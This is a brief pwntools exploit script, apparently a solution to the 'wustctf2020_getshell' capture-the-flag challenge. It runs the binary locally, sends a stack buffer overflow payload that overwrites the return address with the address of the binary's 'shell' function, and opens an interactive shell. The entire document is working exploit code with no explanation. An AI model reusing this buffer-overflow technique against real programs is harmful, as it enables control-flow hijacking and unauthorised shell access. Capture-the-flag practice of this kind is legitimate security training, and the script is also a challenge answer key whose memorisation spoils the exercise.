from pwn import *
context.log_level = 'debug'
elf=ELF('wustctf2020_getshell')
io = process('wustctf2020_getshell')
payload = b'A'*(0x18+0x4)+p32(elf.sym['shell'])
io.sendline(payload)
io.interactive()
